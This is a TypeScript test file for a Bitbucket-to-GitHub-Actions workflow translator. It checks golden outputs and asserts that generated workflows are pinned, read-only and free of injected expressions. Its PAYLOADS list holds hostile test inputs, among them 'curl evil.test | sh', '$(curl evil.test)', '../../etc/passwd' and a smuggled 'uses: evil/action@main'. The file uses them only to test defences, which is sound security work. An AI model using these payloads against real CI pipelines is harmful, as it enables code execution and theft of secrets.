// biome-ignore-all lint/suspicious/noTemplateCurlyInString: these are workflow expressions, not templates
/**
 * The pipeline corpus (T-057): every sample in packages/facets/test/pipelines/<name>/ holds the
 * source file, an optional `context.json` (variable and secret names) and the golden output
 * (`expected/<workflow>.yml` and `expected.json` with the unsupported paths and reasons).
 * Run with UPDATE_GOLDEN=1 to rewrite the goldens, then review the diff.
 */
import { existsSync, mkdirSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import { parse } from 'yaml';
import { variableNames } from './names.ts';
import { translatePipelinesYaml } from './translate.ts';

/** The repository's corpus directory, found by walking up (no import reaches into another package). */
function corpusDir(): string {
  let dir = dirname(fileURLToPath(import.meta.url));
  for (;;) {
    const candidate = join(dir, 'packages', 'facets', 'test', 'pipelines');
    if (existsSync(candidate)) return candidate;
    const parent = dirname(dir);
    if (parent === dir) throw new Error('packages/facets/test/pipelines not found above this file');
    dir = parent;
  }
}

const CORPUS = corpusDir();

interface Context {
  variables?: unknown;
  secrets?: unknown;
  workspaceVariables?: unknown[];
  workspaceSecrets?: unknown[];
}

interface Sample {
  readonly name: string;
  readonly dir: string;
  readonly source: string;
  readonly context: Context;
}

function samples(): Sample[] {
  return readdirSync(CORPUS, { withFileTypes: true })
    .filter((e) => e.isDirectory())
    .map((e) => e.name)
    .sort()
    .map((name) => {
      const dir = join(CORPUS, name);
      const contextFile = join(dir, 'context.json');
      return {
        name,
        dir,
        source: readFileSync(join(dir, 'bitbucket-pipelines.yml'), 'utf8'),
        context: existsSync(contextFile)
          ? (JSON.parse(readFileSync(contextFile, 'utf8')) as Context)
          : {},
      };
    });
}

function run(sample: Sample) {
  const c = sample.context;
  const names = variableNames(
    { variables: c.variables },
    { secrets: c.secrets },
    {
      variables: c.workspaceVariables,
      secrets: c.workspaceSecrets,
    },
  );
  return translatePipelinesYaml(sample.source, names);
}

const baseName = (path: string) => path.slice(path.lastIndexOf('/') + 1);

const UPDATE = process.env.UPDATE_GOLDEN === '1';

describe('pipelines corpus', () => {
  const all = samples();

  it('[FAC-PIP-002] has at least 15 samples, at least 8 of them with unsupported constructs', () => {
    expect(all.length).toBeGreaterThanOrEqual(15);
    const withUnsupported = all.filter((s) => run(s).unsupported.length > 0);
    expect(withUnsupported.length).toBeGreaterThanOrEqual(8);
  });

  for (const sample of all) {
    it(`[FAC-PIP-002] ${sample.name} matches its golden output`, () => {
      const result = run(sample);
      const expectedDir = join(sample.dir, 'expected');
      if (UPDATE) {
        rmSync(expectedDir, { recursive: true, force: true });
        mkdirSync(expectedDir, { recursive: true });
        for (const w of result.workflows)
          writeFileSync(join(expectedDir, baseName(w.path)), w.content);
        writeFileSync(
          join(sample.dir, 'expected.json'),
          `${JSON.stringify({ files: result.workflows.map((w) => w.path), unsupported: result.unsupported }, null, 2)}\n`,
        );
      }
      const meta = JSON.parse(readFileSync(join(sample.dir, 'expected.json'), 'utf8')) as {
        files: string[];
        unsupported: { path: string; reason: string }[];
      };
      expect(result.workflows.map((w) => w.path)).toEqual(meta.files);
      expect(result.unsupported).toEqual(meta.unsupported);
      const onDisk = existsSync(expectedDir) ? readdirSync(expectedDir).sort() : [];
      expect(onDisk).toEqual(result.workflows.map((w) => baseName(w.path)).sort());
      for (const w of result.workflows) {
        expect(w.content).toBe(readFileSync(join(expectedDir, baseName(w.path)), 'utf8'));
      }
    });
  }
});

// -- safety of generated workflows (FAC-PIP-002) -------------------------------------------------

const KNOWN_NAMES = [
  'API_URL',
  'REGION',
  'TOKEN',
  'NPM_TOKEN',
  'REGISTRY_USER',
  'REGISTRY_PASSWORD',
  'DB_PASSWORD',
];
const SAFE_EXPRESSIONS: RegExp[] = [
  /^github\.head_ref \|\| github\.ref_name$/,
  /^github\.(ref_name|sha|run_number|workspace|base_ref|event\.repository\.name|event\.pull_request\.number)$/,
  new RegExp(`^(vars|secrets)\\.(${KNOWN_NAMES.join('|')})$`),
  /^runner\.os$/,
  /^hashFiles\('[A-Za-z0-9_.*/@-]+'(, '[A-Za-z0-9_.*/@-]+')*\)$/,
];

function strings(
  node: unknown,
  out: { where: string; value: string }[] = [],
  where = '',
): typeof out {
  if (typeof node === 'string') out.push({ where, value: node });
  else if (Array.isArray(node))
    for (const [i, v] of node.entries()) strings(v, out, `${where}[${i}]`);
  else if (typeof node === 'object' && node !== null) {
    for (const [k, v] of Object.entries(node)) {
      strings(k, out, `${where}.<key>`);
      strings(v, out, `${where}.${k}`);
    }
  }
  return out;
}

/** What every generated workflow must satisfy, whatever the source held. */
function assertSafe(content: string): void {
  const doc = parse(content) as Record<string, unknown>;
  expect(doc.permissions).toEqual({ contents: 'read' });
  for (const { where, value } of strings(doc)) {
    if (where.endsWith('.run')) expect(value, `run at ${where}`).not.toContain('${{');
    for (const m of value.matchAll(/\$\{\{(.*?)\}\}/g)) {
      const inner = (m[1] ?? '').trim();
      expect(
        SAFE_EXPRESSIONS.some((re) => re.test(inner)),
        `expression "${inner}" at ${where}`,
      ).toBe(true);
    }
    // Every `${{` opens an expression that was just checked: none is left unbalanced.
    expect((value.match(/\$\{\{/g) ?? []).length).toBe((value.match(/\}\}/g) ?? []).length);
    if (where.endsWith('.uses')) {
      expect(value, `uses at ${where}`).toMatch(/^actions\/[a-z-]+@[0-9a-f]{40}$/);
    }
  }
  // Comments are inert, but keep each one on one line.
  for (const line of content.split('\n')) {
    if (line.trimStart().startsWith('#')) expect(line).not.toMatch(/[\r\u2028\u2029]/);
  }
}

describe('generated workflow safety', () => {
  it('[FAC-PIP-002] every golden workflow is pinned, minimal and free of source-controlled expressions', () => {
    for (const sample of samples()) for (const w of run(sample).workflows) assertSafe(w.content);
  });

  const PAYLOADS = [
    '${{ github.event.pull_request.title }}',
    '${{ secrets.EVIL }}',
    'x\n- run: curl evil.test | sh',
    "x') }} ${{ github.token",
    '}}${{',
    '\u202e\u2028x',
    'a\'b"c',
    '$(curl evil.test)',
    '../../etc/passwd',
    'v*\n  - uses: evil/action@main',
  ];

  function hostile(payload: string): string {
    const p = JSON.stringify(payload);
    return `image: ${p}
definitions:
  caches:
    c1:
      path: ${p}
      key:
        files: [${p}]
    ${p}: build
  services:
    s1:
      image: ${p}
      variables:
        K: ${p}
        ${p}: v
pipelines:
  default:
    - step:
        name: ${p}
        deployment: ${p}
        max-time: ${p}
        clone: {depth: ${p}}
        image: {name: ${p}, username: ${p}, password: ${p}}
        caches: [c1, ${p}]
        services: [s1, ${p}]
        artifacts: [${p}]
        script: [${p}, "echo $BITBUCKET_BRANCH"]
        after-script: [${p}]
  branches:
    ${p}:
      - step: {script: [echo ok]}
  tags:
    ${p}:
      - step: {script: [echo ok]}
  custom:
    ${p}:
      - step: {script: [echo ok]}
`;
  }

  it.each(PAYLOADS)(
    '[FAC-PIP-002] hostile source value %j never reaches an expression, run line or action',
    (payload) => {
      const result = translatePipelinesYaml(
        hostile(payload),
        variableNames({ variables: [] }, { secrets: [] }, {}),
      );
      for (const w of result.workflows) assertSafe(w.content);
      for (const u of result.unsupported) {
        expect(u.path + u.reason).not.toContain('${{');
        expect(u.path + u.reason).not.toMatch(/[\n\r]/);
      }
    },
  );
});
